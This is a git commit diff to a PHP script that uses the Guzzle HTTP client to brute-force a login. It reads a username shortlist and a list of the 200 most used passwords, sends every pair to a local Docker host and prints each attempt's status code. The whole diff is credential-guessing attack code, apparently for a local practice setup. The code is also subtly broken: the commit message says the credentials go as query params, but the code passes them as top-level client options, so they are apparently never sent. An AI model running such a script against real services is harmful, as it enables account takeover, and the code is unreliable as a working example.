91d8f44b381e28cdfc291b8248ede71385dca850
Carlos Ferreira <carlos@especializati.com.br>
2023-01-26 11:28:10 -0300

    feat: send request to frontend, with query params

--- server/public/index.php
+++ server/public/index.php
@@ -4,26 +4,21 @@ use GuzzleHttp\Client as Guzzle;
 
 require_once __DIR__ . '/../vendor/autoload.php';
 
+$client = new Guzzle(['base_uri' => 'http://host.docker.internal:80']);
+
 $usernames = fopen('top-usernames-shortlist.txt', 'r');
-$passwords = fopen('2020-200_most_used_passwords.txt', 'r');
-
-$client = new Guzzle(['base_uri' => 'http://host.docker.internal:8989']);
-$request = $client->request('GET', '/api');
-$html = (string) $request->getBody();
-echo $request->getStatusCode();
-var_dump(htmlspecialchars($html));
-
-die('shutdown');
-
 while(!feof($usernames)) {
     $username = fgets($usernames);
+
+    $passwords = fopen('2020-200_most_used_passwords.txt', 'r');
     while(!feof($passwords)) {
         $password = fgets($passwords);
-        echo 'DEBUG => username: ' . $username . ' - password: ' . $password . "<br>";
-        $response = $client->request('POST', '/', [
+        echo 'DEBUG => username: ' . $username . ' - password: ' . $password;
+        $response = $client->request('GET', '/', [
             'username' => $username,
             'password' => $password
         ]);
+        echo "status: {$response->getStatusCode()} <br>";
     }
 }
 
